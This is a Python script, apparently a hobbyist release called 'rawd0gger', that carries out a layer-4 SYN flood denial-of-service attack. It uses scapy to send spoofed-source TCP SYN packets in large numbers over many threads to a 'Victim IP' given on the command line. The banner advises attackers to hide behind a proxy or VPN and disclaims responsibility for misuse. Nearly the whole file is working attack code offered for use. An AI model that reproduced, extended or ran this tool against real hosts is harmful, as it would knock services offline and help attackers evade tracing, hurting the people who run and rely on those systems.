# 3dog rawd0gger L4 DOS Attack Tool. 
# t0rkelSec 2023.
import argparse
import random
import threading
import time
from scapy.all import send, IP, TCP

#Version and Info
version = "1.0.0"
print("3dog rawd0gger DOS tool, t0rkelSec 2023. \n Version: " + version + "\n")

print(r""" rawd0gger    rawd0gger    rawd0gger    rawd0gger    rawd0gger    rawd0gger    rawd0gger    rawd0gger    rawd0gger     
                
                       3dog ██████████████████████████████████████▀█████▀█████████████
                            █▄─▄▄▀██▀▄─██▄─█▀▀▀█─▄█▄─▄▄▀█─▄▄─█─▄▄▄▄█─▄▄▄▄█▄─▄▄─█▄─▄▄▀█
                            ██─▄─▄██─▀─███─█─█─█─███─██─█─██─█─██▄─█─██▄─██─▄█▀██─▄─▄█
                            ▀▄▄▀▄▄▀▄▄▀▄▄▀▀▄▄▄▀▄▄▄▀▀▄▄▄▄▀▀▄▄▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀                            

                                                            ....'````'.                             
                                           ..'^",,,,,,,,::,,""^^^"`'``^).                           
                            .`^,IIl;,i-!,::"`'.              `,;"`":;^ '}                           
                         'I];`^1.     '>]`                 '[^       !l -`                          
                        ;l.  '{.  ';:`   ^!.                          ^~'{                          
                        ~^  .|.      ';!,; ]`                  .:;;;;;^:;]`                         
                        '-  ]^          <f' }.                ^~.     .:z`1                         
                         1..(^;.        -'<^']               ^>        :)<>`                        
                         "I'- .:i`      1  )'~"             'j`       "! r'(                        
                          j')    `!;.  ^l  '}.(             (.,~.    `~  l,-^                       
                          ~^-`     .i;.|.   }.>'           ;^  .<,. .(   `-.)                       
                          `+.}       '{|    ,,.            \     `}i?`   .| ]'                      
                           | "l       ?,i"  '_            `-       :v`   .1 `>                      
                           ]. "<     l:  '>`.f            ^>      ;] ^<' ::  j                      
                           ";  `_'  ;:     ,!v.            |.   '?,    ,!j.  >"                     
                            t   .>_`-        (.            `]  .~       <"   `+                     
                            ~^    .+:        r              `-.        ^~    .(                     
                            .)      '<;'    "~               .~,.    .I:      t                     
                             ~'       .,;,,;`    .!!::;        .,,,"::.     .'f                     
                             .(                  /'   '].                .,::~`                     
                              _^    .'`.        .\     "<,              ,?.                         
                              '-;;;:^`',l,.     .\     .jl       ...'`,>^                           
                                         .]'     /'   `!"       :~``''.                             
                                           |.    `1II,'         "i                                  
                                           ^<                   `-                                  
                                            (                   .|                                  
                                            }.                   )'                                 
                                           `&I               ',?tz>                                 
                                            #M;I<>I;,`'";<?|nn{\I,t                                 
                                            {*^:!f;,<ij;'..(   ;c`#.                                
                                            '#'  ;#`  <)   j;  (r'n^                                
                                             -_``?$u .?_i;;}Wl[/|::.                                
                                              I<i[c?I<!,,,"`''''              
                 
                                                                                                    
                                                                                                2023
      rawd0gger    rawd0gger    rawd0gger    rawd0gger    rawd0gger    rawd0gger    rawd0gger    
                                                                                                 """)

print("Please read the program usage in readme.md \n While this program randomizes the IP in the TCP Protocol you are not fully anonymous.\n If you wish to protect yourself consider using a proxy and//or VPN while running this program. \n \n \n Use Responsibly. We are not responsible for Malicous Use.\n  ")

time.sleep(1.5)

#Max Packages and Max Port Defaults
DEFAULT_PACK = 99999999
MAX_PORTS = 65535

def random_IP():
    IP = ".".join(map(str,(random.randint(0,255)for _ in range(4))))
    return IP


#Get user Arguments from the CLI
def get_args():
    parser = argparse.ArgumentParser(description="\n RAWD0GGER SYN Flooder\n)")
    parser.add_argument('t', help="Victim IP // Adress")
    parser.add_argument('-a', type=int,help="The Ammount of Packets to send per thread (Default is the Maximum)", default=DEFAULT_PACK)
    parser.add_argument('-p',type=int,help="Target Port (Default is 80)", default=80)
    args = parser.parse_args()
    return args.t, args.p, args.a

#SYN Flood function
def SYN_flood(Target_IP, dPort, packets_to_send):
    print("Sending Packets to IP " + Target_IP + "...")
    for i in range(packets_to_send):
        seq_n = random.randint(0, MAX_PORTS)
        sPort = random.randint(0, MAX_PORTS)
        Window = random.randint(0, MAX_PORTS)
        src_IP = random_IP()
        packet = IP(dst=Target_IP, src=src_IP)/TCP(sport=sPort, dport=dPort, flags="S", seq=seq_n, window=Window)
        send(packet, verbose=0)
    print("Packets Sent.")

def main():
    Target_IP, dPort, packets_to_send = get_args()
    SYN_flood(Target_IP, dPort, packets_to_send)

#Start threads
if __name__=="__main__":
    print("v"+version + " \n Work in Progress, May still have bugs!, please read program instructions before use. \n \n")
    Thread_Ammount = int(input("How Many threads would you like to start? (Atleast one required for program to run): "))
    for i in range(Thread_Ammount):
        thread = threading.Thread(target=main)
        thread.start()

#for all the skids out there lol
